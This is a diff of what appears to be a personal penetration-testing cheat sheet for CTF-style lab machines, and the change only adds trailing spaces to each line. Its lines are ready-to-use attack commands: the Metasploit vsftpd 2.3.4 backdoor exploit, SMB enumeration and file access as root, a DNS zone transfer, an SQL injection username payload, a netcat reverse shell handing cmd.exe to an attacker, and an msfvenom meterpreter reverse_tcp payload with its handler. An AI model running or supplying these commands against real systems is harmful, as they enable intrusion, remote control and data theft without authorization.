@@ -30,42 +30,42 @@ grep -ir 'password'
 
 
 #VSFTPD v2.3.4 Backdoor Command Execution  
-msf > use exploit/unix/ftp/vsftpd_234_backdoor
-msf exploit(vsftpd_234_backdoor) > show targets
-    ...targets...
-msf exploit(vsftpd_234_backdoor) > set TARGET < target-id >
-msf exploit(vsftpd_234_backdoor) > show options
-    ...show and set options...
-msf exploit(vsftpd_234_backdoor) > exploit
-open port 21 then nc on 6200
+msf > use exploit/unix/ftp/vsftpd_234_backdoor  
+msf exploit(vsftpd_234_backdoor) > show targets  
+    ...targets...  
+msf exploit(vsftpd_234_backdoor) > set TARGET < target-id >  
+msf exploit(vsftpd_234_backdoor) > show options  
+    ...show and set options...  
+msf exploit(vsftpd_234_backdoor) > exploit  
+open port 21 then nc on 6200  
 
 
-#SMB
-smbmap -H 10.10.10.123 -u root -p 445
-nmap --script smb-enum-shares -p139 10.10.10.123 
-smbclient //10.10.10.123/general -U root
-smb: \> ls
-smb: \> get
-#upload file
-curl --upload-file /path/to/file.ext -u 'DOMAIN\Username' smb://172.16.17.52/ShareName/
+#SMB  
+smbmap -H 10.10.10.123 -u root -p 445  
+nmap --script smb-enum-shares -p139 10.10.10.123   
+smbclient //10.10.10.123/general -U root  
+smb: \> ls  
+smb: \> get  
+#upload file  
+curl --upload-file /path/to/file.ext -u 'DOMAIN\Username' smb://172.16.17.52/ShareName/  
 
-#DNS
-dig axfr <subdomain>@10.10.10.123
+#DNS  
+dig axfr <subdomain>@10.10.10.123  
 
-#Visualize strings in binary files
-tool -> bless
+#Visualize strings in binary files  
+tool -> bless  
 
-#Read pst file
-tool -> readpst
+#Read pst file  
+tool -> readpst  
 
-#Trick SQLI 
-creating an account with the username user’ OR 1=1#
-and when you logging in you see all notes
+#Trick SQLI   
+creating an account with the username user’ OR 1=1#  
+and when you logging in you see all notes  
 
-#reverse shell windows 
-nc64.exe -e cmd.exe [IP] [Port]
+#reverse shell windows   
+nc64.exe -e cmd.exe [IP] [Port]  
 
-#metasploit
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.251 LPORT=4444 -f exe -a x64 -o payload.exe — platform windows
-msf> use exploit/multi/handler
-> set payload windows/x64/meterpreter/reverse_tcp
+#Metasploit  
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.251 LPORT=4444 -f exe -a x64 -o payload.exe — platform windows  
+msf> use exploit/multi/handler  
+> set payload windows/x64/meterpreter/reverse_tcp  
